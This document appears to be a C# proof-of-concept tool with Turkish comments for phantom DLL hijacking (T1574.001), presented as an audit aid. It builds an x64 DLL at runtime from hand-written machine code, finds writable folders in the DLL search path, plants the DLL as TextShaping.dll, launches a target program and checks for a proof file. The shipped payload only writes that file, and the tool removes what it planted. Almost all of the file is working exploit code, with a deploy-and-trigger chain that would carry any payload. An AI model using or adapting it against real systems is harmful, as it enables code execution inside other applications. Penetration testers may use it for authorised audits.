using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;

// PhantomDllHijackProbe v3 — T1574.001 Phantom DLL Hijacking
// MITRE ATT&CK: T1574.001
//
// Bagimsiz — DLL payload PE'si runtime'da ic olarak uretilir.
// Ek dosya gerekmez. Sadece bu exe calistirilir.
//
// C# 5 / .NET 4.x uyumlu

// ─────────────────────────────────────────────────────────────────────────────
//  PE BUILDER — hardcoded x64 DllMain + import table
//  Layout:
//    TEXT_RVA  = 0x1000 (128 byte DllMain)
//    RDATA_RVA = 0x2000 (IDT + ILT + IAT + HintName + strings)
//
//  RDATA ichindeki RVA'lar:
//    IDT_OFF  = 0x000   ILT_RVA   = 0x2028
//    ILT_OFF  = 0x028   IAT_RVA   = 0x2048
//    IAT_OFF  = 0x048   DLL_NAME  = 0x2090
//    HN_OFF   = 0x068   PATH_RVA  = 0x209E
//                        TEXT_RVA  = 0x20C4   PROOF_LEN = 132
//
//  IAT sirasi:  [0]=CreateFileA@0x2048, [1]=WriteFile@0x2050, [2]=CloseHandle@0x2058
// ─────────────────────────────────────────────────────────────────────────────

class PhantomDllHijackProbe
{
    const string DLL_TARGET = "TextShaping.dll";
    const string PROOF_FILE = @"C:\Windows\Temp\phantom_dll_proof.txt";
    const string LOG_FILE   = @"C:\Windows\Temp\phantom_dll_log.txt";
    const string WIN_APPS   = @"C:\Program Files\WindowsApps";

    static string tempDllPath  = null;  // uretilen DLL (temizlenecek)
    static string deployedPath = null;  // hedef deploy (temizlenecek)

    // ── x64 DllMain makine kodu (128 byte) ───────────────────────────────────
    static readonly byte[] TEXT_CODE = new byte[]
    {
        // push rbp/rbx/rdi ; sub rsp,0x20
        0x55, 0x53, 0x57, 0x48, 0x83, 0xEC, 0x20,
        // cmp edx,1 ; jnz +103 (.done = offset 0x73)
        0x83, 0xFA, 0x01, 0x75, 0x67,
        // lea rcx,[rip+0x108B] → PATH_RVA 0x209E  (from RIP=0x1013)
        0x48, 0x8D, 0x0D, 0x8B, 0x10, 0x00, 0x00,
        // mov edx,0x40000000 (GENERIC_WRITE)
        0xBA, 0x00, 0x00, 0x00, 0x40,
        // xor r8d,r8d ; xor r9d,r9d
        0x45, 0x33, 0xC0, 0x45, 0x33, 0xC9,
        // mov dword[rsp+32],2 (CREATE_ALWAYS)
        0xC7, 0x44, 0x24, 0x20, 0x02, 0x00, 0x00, 0x00,
        // mov dword[rsp+40],0x80 (FILE_ATTRIBUTE_NORMAL)
        0xC7, 0x44, 0x24, 0x28, 0x80, 0x00, 0x00, 0x00,
        // mov qword[rsp+48],0
        0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00,
        // call [rip+0x100B] → CreateFileA IAT 0x2048  (from RIP=0x103D)
        0xFF, 0x15, 0x0B, 0x10, 0x00, 0x00,
        // cmp rax,-1 ; je +48 (.done)
        0x48, 0x83, 0xF8, 0xFF, 0x74, 0x30,
        // mov rdi,rax ; mov rcx,rdi
        0x48, 0x89, 0xC7, 0x48, 0x89, 0xF9,
        // lea rdx,[rip+0x1074] → TEXT_DATA_RVA 0x20C4  (from RIP=0x1050)
        0x48, 0x8D, 0x15, 0x74, 0x10, 0x00, 0x00,
        // mov r8d,132 (PROOF_LEN)
        0x41, 0xB8, 0x84, 0x00, 0x00, 0x00,
        // lea r9,[rsp+4]
        0x4C, 0x8D, 0x4C, 0x24, 0x04,
        // mov qword[rsp+32],0 (lpOverlapped)
        0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00,
        // call [rip+0xFE6] → WriteFile IAT 0x2050  (from RIP=0x106A)
        0xFF, 0x15, 0xE6, 0x0F, 0x00, 0x00,
        // mov rcx,rdi
        0x48, 0x89, 0xF9,
        // call [rip+0xFE5] → CloseHandle IAT 0x2058  (from RIP=0x1073)
        0xFF, 0x15, 0xE5, 0x0F, 0x00, 0x00,
        // .done: mov eax,1 ; add rsp,0x20 ; pop rdi/rbx/rbp ; ret
        0xB8, 0x01, 0x00, 0x00, 0x00,
        0x48, 0x83, 0xC4, 0x20,
        0x5F, 0x5B, 0x5D, 0xC3
    };

    static byte[] BuildRdata()
    {
        using (var ms = new MemoryStream())
        {
            // IDT[0]: OrigFirstThunk ILT=0x2028, TS=0, FC=0, Name=0x2090, FirstThunk IAT=0x2048
            W32(ms, 0x2028); W32(ms, 0); W32(ms, 0); W32(ms, 0x2090); W32(ms, 0x2048);
            // IDT null terminator
            ms.Write(new byte[20], 0, 20);
            // ILT (QWORD per entry + null)
            W64(ms, 0x2068); W64(ms, 0x2076); W64(ms, 0x2082); W64(ms, 0);
            // IAT (same as ILT; loader overwrites at runtime)
            W64(ms, 0x2068); W64(ms, 0x2076); W64(ms, 0x2082); W64(ms, 0);
            // Hint/Name: hint(2) + name + null, padded to even
            // CreateFileA: 14 bytes (hint=0, "CreateFileA\0")
            ms.Write(new byte[] { 0,0, 0x43,0x72,0x65,0x61,0x74,0x65,0x46,0x69,0x6C,0x65,0x41,0 }, 0, 14);
            // WriteFile: 12 bytes
            ms.Write(new byte[] { 0,0, 0x57,0x72,0x69,0x74,0x65,0x46,0x69,0x6C,0x65,0 }, 0, 12);
            // CloseHandle: 14 bytes
            ms.Write(new byte[] { 0,0, 0x43,0x6C,0x6F,0x73,0x65,0x48,0x61,0x6E,0x64,0x6C,0x65,0 }, 0, 14);
            // KERNEL32.dll\0\0 — 14 bytes (pad to even)
            ms.Write(new byte[] { 0x4B,0x45,0x52,0x4E,0x45,0x4C,0x33,0x32,0x2E,0x64,0x6C,0x6C,0,0 }, 0, 14);
            // proof_path (38 bytes: "C:\Windows\Temp\phantom_dll_proof.txt\0")
            byte[] pp = Encoding.ASCII.GetBytes("C:\\Windows\\Temp\\phantom_dll_proof.txt\x00");
            ms.Write(pp, 0, pp.Length);
            // proof_text (132 bytes)
            byte[] pt = Encoding.ASCII.GetBytes(
                "=== PHANTOM DLL HIJACKING - AUDIT KANITI ===\r\n" +
                "MITRE ATT&CK: T1574.001\r\n" +
                "Teknik: Phantom DLL Hijacking (WindowsApps/TextShaping.dll)\r\n");
            ms.Write(pt, 0, pt.Length);
            return ms.ToArray();
        }
    }

    static byte[] BuildProofDll()
    {
        const long IMAGE_BASE = 0x180000000L;
        const int  FILE_ALIGN = 0x200;
        const int  SECT_ALIGN = 0x1000;
        const int  TEXT_RVA   = 0x1000;
        const int  RDATA_RVA  = 0x2000;
        const int  TEXT_RAW   = 0x200;
        const int  RDATA_RAW  = 0x400;

        byte[] tc    = TEXT_CODE;
        byte[] rdata = BuildRdata();
        int trsz  = AlignUp(tc.Length,    FILE_ALIGN);
        int rrsz  = AlignUp(rdata.Length, FILE_ALIGN);
        int imgSz = AlignUp(RDATA_RVA + AlignUp(rdata.Length, SECT_ALIGN), SECT_ALIGN);

        byte[] pe = new byte[RDATA_RAW + rrsz];

        // ── DOS header ────────────────────────────────────────────────────────
        pe[0] = 0x4D; pe[1] = 0x5A;      // MZ
        W32(pe, 0x3C, 0x40);             // e_lfanew → 0x40

        // ── PE signature ──────────────────────────────────────────────────────
        W32(pe, 0x40, 0x4550);           // "PE\0\0"

        // ── COFF header (at 0x44, 20 bytes) ──────────────────────────────────
        W16(pe, 0x44, 0x8664);           // Machine = AMD64
        W16(pe, 0x46, 2);               // NumberOfSections
                                        // 0x48-0x53: zeros (TS, PtrSym, NumSym)
        W16(pe, 0x54, 240);             // SizeOfOptionalHeader
        W16(pe, 0x56, 0x2022);          // Characteristics: EXE|LARGE_ADDR|DLL

        // ── Optional header (PE32+, at 0x58, 240 bytes) ───────────────────────
        W16(pe, 0x58, 0x020B);          // Magic PE32+
        W32(pe, 0x5C, trsz);            // SizeOfCode
        W32(pe, 0x60, rrsz);            // SizeOfInitializedData
        W32(pe, 0x68, TEXT_RVA);        // AddressOfEntryPoint (= DllMain)
        W32(pe, 0x6C, TEXT_RVA);        // BaseOfCode
        W64(pe, 0x70, IMAGE_BASE);      // ImageBase
        W32(pe, 0x78, SECT_ALIGN);      // SectionAlignment
        W32(pe, 0x7C, FILE_ALIGN);      // FileAlignment
        W16(pe, 0x80, 6);              // MajorOperatingSystemVersion
        W16(pe, 0x88, 6);              // MajorSubsystemVersion
        W32(pe, 0x90, imgSz);           // SizeOfImage
        W32(pe, 0x94, 0x200);           // SizeOfHeaders
        W16(pe, 0x9C, 3);              // Subsystem = Console
        W16(pe, 0x9E, 0x0100);         // DllCharacteristics = NX_COMPAT
        W64(pe, 0xA0, 0x100000L);       // SizeOfStackReserve
        W64(pe, 0xA8, 0x1000L);         // SizeOfStackCommit
        W64(pe, 0xB0, 0x100000L);       // SizeOfHeapReserve
        W64(pe, 0xB8, 0x1000L);         // SizeOfHeapCommit
        W32(pe, 0xC4, 16);              // NumberOfRvaAndSizes

        // Data directories (base = 0xC8)
        // [1] Import Directory at 0xD0
        W32(pe, 0xD0, RDATA_RVA);       // IDT RVA (= .rdata start)
        W32(pe, 0xD4, 40);              // IDT size (2 entries * 20)
        // [12] IAT at 0x128 (0xC8 + 12*8)
        W32(pe, 0x128, 0x2048);         // IAT RVA
        W32(pe, 0x12C, 32);             // IAT size (4 * 8)

        // ── Section headers (at 0x148) ────────────────────────────────────────
        // .text
        byte[] sn1 = Encoding.ASCII.GetBytes(".text\x00\x00\x00");
        Array.Copy(sn1, 0, pe, 0x148, 8);
        W32(pe, 0x150, tc.Length);      // VirtualSize
        W32(pe, 0x154, TEXT_RVA);       // VirtualAddress
        W32(pe, 0x158, trsz);           // SizeOfRawData
        W32(pe, 0x15C, TEXT_RAW);       // PointerToRawData
        W32(pe, 0x16C, 0x60000020);     // Characteristics: CODE|EXEC|READ

        // .rdata
        byte[] sn2 = Encoding.ASCII.GetBytes(".rdata\x00\x00");
        Array.Copy(sn2, 0, pe, 0x170, 8);
        W32(pe, 0x178, rdata.Length);   // VirtualSize
        W32(pe, 0x17C, RDATA_RVA);      // VirtualAddress
        W32(pe, 0x180, rrsz);           // SizeOfRawData
        W32(pe, 0x184, RDATA_RAW);      // PointerToRawData
        W32(pe, 0x194, 0x40000040);     // Characteristics: IDATA|READ

        // ── Section data ─────────────────────────────────────────────────────
        Array.Copy(tc,    0, pe, TEXT_RAW,  tc.Length);
        Array.Copy(rdata, 0, pe, RDATA_RAW, rdata.Length);

        return pe;
    }

    // Little-endian write helpers
    static void W16(byte[] b, int o, int v)  { b[o]=(byte)v; b[o+1]=(byte)(v>>8); }
    static void W32(byte[] b, int o, int v)  { b[o]=(byte)v; b[o+1]=(byte)(v>>8); b[o+2]=(byte)(v>>16); b[o+3]=(byte)(v>>24); }
    static void W32(byte[] b, int o, uint v) { W32(b,o,(int)v); }
    static void W64(byte[] b, int o, long v) { W32(b,o,(int)v); W32(b,o+4,(int)(v>>32)); }
    static void W32(MemoryStream m, uint v)  { m.WriteByte((byte)v); m.WriteByte((byte)(v>>8)); m.WriteByte((byte)(v>>16)); m.WriteByte((byte)(v>>24)); }
    static void W64(MemoryStream m, ulong v) { W32(m,(uint)v); W32(m,(uint)(v>>32)); }
    static int  AlignUp(int n, int a)        { return (n+a-1)&~(a-1); }

    // ── Yardimci ─────────────────────────────────────────────────────────────

    static void Log(string msg)
    {
        string line = "[" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "] " + msg;
        Console.WriteLine(line);
        try { File.AppendAllText(LOG_FILE, line + Environment.NewLine); } catch { }
    }

    static bool IsWritable(string dir)
    {
        try
        {
            string t = Path.Combine(dir, "__probe_" + Guid.NewGuid().ToString("N") + ".tmp");
            File.WriteAllText(t, "x"); File.Delete(t); return true;
        }
        catch { return false; }
    }

    static List<string[]> GetSearchPaths(string appDir)
    {
        var list = new List<string[]>();
        if (!string.IsNullOrEmpty(appDir) && Directory.Exists(appDir))
            list.Add(new string[] { appDir, "Uygulama dizini" });
        list.Add(new string[] { Environment.GetFolderPath(Environment.SpecialFolder.System), "System32" });
        string wow = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "SysWOW64");
        if (Directory.Exists(wow)) list.Add(new string[] { wow, "SysWOW64" });
        list.Add(new string[] { Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Windows" });
        foreach (string seg in (Environment.GetEnvironmentVariable("PATH") ?? "").Split(';'))
        {
            string t = seg.Trim();
            if (!string.IsNullOrEmpty(t) && Directory.Exists(t))
                list.Add(new string[] { t, "PATH" });
        }
        return list;
    }

    static List<string[]> ScanWindowsApps()
    {
        var r = new List<string[]>();
        try
        {
            foreach (string d in Directory.GetDirectories(WIN_APPS))
            {
                try
                {
                    foreach (string e in Directory.GetFiles(d, "*.exe", SearchOption.TopDirectoryOnly))
                        r.Add(new string[] { Path.GetFileName(d), e });
                }
                catch { }
            }
        }
        catch { }
        return r;
    }

    static void Cleanup()
    {
        foreach (string p in new string[] { deployedPath, tempDllPath })
        {
            if (p != null && File.Exists(p))
            {
                try { File.Delete(p); Log("Silindi: " + p); }
                catch (Exception ex) { Log("Silme hatasi: " + p + " — " + ex.Message); }
            }
        }
    }

    // ── Main ─────────────────────────────────────────────────────────────────

    static void Main(string[] args)
    {
        Console.Title = "PhantomDllHijackProbe v3 - T1574.001 Audit";
        Console.WriteLine("============================================================");
        Console.WriteLine("  T1574.001 - Phantom DLL Hijacking (Audit PoC v3)");
        Console.WriteLine("  DLL    : " + DLL_TARGET);
        Console.WriteLine("  Kanit  : " + PROOF_FILE);
        Console.WriteLine("  Log    : " + LOG_FILE);
        Console.WriteLine("============================================================");
        Console.WriteLine();

        // 1. Proof DLL'i runtime'da uret
        Console.WriteLine("[*] Payload DLL uretiliyor...");
        byte[] dllBytes = BuildProofDll();
        tempDllPath = Path.Combine(Path.GetTempPath(), "TextShapingProof_" + Guid.NewGuid().ToString("N") + ".dll");
        File.WriteAllBytes(tempDllPath, dllBytes);
        Log("Payload DLL uretildi: " + tempDllPath + " (" + dllBytes.Length + " bytes)");

        // 2. Phantom kontrol
        Console.WriteLine("\n--- PHANTOM DLL KONTROL ---");
        string[] chk = {
            Environment.GetFolderPath(Environment.SpecialFolder.System),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "SysWOW64"),
            Environment.GetFolderPath(Environment.SpecialFolder.Windows)
        };
        bool isPhantom = true;
        foreach (string d in chk)
        {
            string full = Path.Combine(d, DLL_TARGET);
            bool ex = File.Exists(full);
            if (ex) isPhantom = false;
            Log("  " + (ex ? "[MEVCUT] " : "[YOK]    ") + full);
        }
        Console.WriteLine(isPhantom
            ? "\n  [+] TextShaping.dll sistem dizinlerinde YOK — Phantom senaryo GECERLI.\n"
            : "\n  [-] TextShaping.dll en az bir dizinde MEVCUT.\n");

        // 3. Uygulama secimi
        Console.WriteLine("--- WINDOWSAPPS UYGULAMA SECIMI ---");
        var apps = ScanWindowsApps();
        string selectedDir = null;
        if (apps.Count > 0)
        {
            int show = Math.Min(apps.Count, 20);
            for (int i = 0; i < show; i++)
                Console.WriteLine("  [" + (i+1) + "] " + apps[i][0]);
            if (apps.Count > 20) Console.WriteLine("  ... (+" + (apps.Count-20) + " daha)");
            Console.Write("\nUygulama sec (0=atla): ");
            int ch;
            if (int.TryParse(Console.ReadLine(), out ch) && ch >= 1 && ch <= apps.Count)
            {
                selectedDir = Path.GetDirectoryName(apps[ch-1][1]);
                Log("Secilen: " + apps[ch-1][0]);
            }
        }
        else Console.WriteLine("  WindowsApps listelenemedi.");

        // 4. Yazilabilir arama yolu tara
        Console.WriteLine("\n--- DLL ARAMA YOLU TARAMASI ---");
        var paths      = GetSearchPaths(selectedDir);
        var candidates = new List<string[]>();
        foreach (string[] entry in paths)
        {
            bool exists   = Directory.Exists(entry[0]);
            bool writable = exists && IsWritable(entry[0]);
            bool dllEx    = exists && File.Exists(Path.Combine(entry[0], DLL_TARGET));
            string status = !exists ? "YOK         " : writable ? "YAZILABILIR " : "SALT-OKUNUR ";
            string mark   = dllEx ? " [DLL mevcut]" : " [DLL yok — aday]";
            Console.WriteLine("  [" + status + "] [" + entry[1].PadRight(16) + "] " + entry[0] + mark);
            if (writable && !dllEx) candidates.Add(entry);
        }
        if (candidates.Count == 0)
        {
            Log("Uygun yazilabilir yol bulunamadi."); Console.ReadKey(); Cleanup(); return;
        }
        Console.WriteLine("\n  [+] " + candidates.Count + " aday yol.");

        // 5. Hedef yol sec
        Console.WriteLine("\n--- YOL SECIMI ---");
        for (int i = 0; i < candidates.Count; i++)
            Console.WriteLine("  [" + (i+1) + "] [" + candidates[i][1] + "] " + candidates[i][0]);
        Console.Write("\nSec (1-" + candidates.Count + ") | 0=cikis: ");
        int sel;
        if (!int.TryParse(Console.ReadLine(), out sel) || sel < 1 || sel > candidates.Count)
        { Log("Cikis."); Cleanup(); return; }

        string targetDir  = candidates[sel-1][0];
        deployedPath      = Path.Combine(targetDir, DLL_TARGET);
        Log("Hedef: " + deployedPath);

        // 6. Tetikleyici
        Console.Write("\nTetikleyici exe yolu (bos=manuel): ");
        string trigger = (Console.ReadLine() ?? "").Trim();

        // 7. Ozet + onay
        Console.WriteLine("\n--- OZET ---");
        Console.WriteLine("  Deploy  : " + deployedPath);
        Console.WriteLine("  Kanit   : " + PROOF_FILE);
        Console.WriteLine("  Tetikle : " + (trigger == "" ? "(manuel)" : trigger));
        Console.WriteLine("  Temizlik: Otomatik");
        Console.Write("Devam? (E/H): ");
        string c = Console.ReadLine();
        if (c == null || c.Trim().ToUpper() != "E") { Log("Iptal."); Cleanup(); return; }

        // 8. DLL deploy
        try
        {
            File.Copy(tempDllPath, deployedPath, false);
            Log("Deploy edildi: " + deployedPath + " (" + new FileInfo(deployedPath).Length + " bytes)");
        }
        catch (Exception ex) { Log("Deploy hatasi: " + ex.Message); Cleanup(); Console.ReadKey(); return; }

        // 9. Tetikle
        if (trigger != "" && File.Exists(trigger))
        {
            Log("Tetikleniyor: " + trigger);
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = trigger; psi.UseShellExecute = true;
                using (Process p = Process.Start(psi)) Log("PID: " + (p != null ? p.Id.ToString() : "?"));
            }
            catch (Exception ex) { Log("Tetikleme hatasi: " + ex.Message); }
        }
        else Console.WriteLine("\n[*] Hedef uygulamayi elle calistirin...");

        // 10. Kanit bekle (90 sn)
        Console.WriteLine();
        Log("Kanit bekleniyor: " + PROOF_FILE + " (max 90s)");
        bool found = false;
        for (int i = 1; i <= 90; i++)
        {
            if (File.Exists(PROOF_FILE)) { found = true; break; }
            Console.Write("\r  Bekleniyor... " + i + "/90s");
            Thread.Sleep(1000);
        }
        Console.WriteLine();

        // 11. Sonuc
        if (found)
        {
            string proof = File.ReadAllText(PROOF_FILE);
            Log("=== ZAFIYET DOGRULANDI ===\n" + proof.Trim());
            Console.WriteLine();
            Console.WriteLine("============================================================");
            Console.WriteLine("  [!!!] PHANTOM DLL HIJACKING DOGRULANDI - T1574.001");
            Console.WriteLine("============================================================");
            Console.WriteLine(proof.Trim());
            Console.WriteLine("============================================================");
        }
        else
        {
            Log("Kanit dosyasi olusturulmadi.");
            Console.WriteLine("\n[?] Kontrol edin:");
            Console.WriteLine("    1. Uygulama TextShaping.dll ariyor mu? (ProcMon)");
            Console.WriteLine("    2. Secilen yol arama sirasinda dogru mu?");
            Console.WriteLine("    3. x86/x64 uyumu?");
        }

        // 12. Temizlik ve cikis
        Cleanup();
        Log("Bitti.");
        Console.WriteLine("\nProgram 4 saniye sonra kapanacak...");
        Thread.Sleep(4000);
    }
}
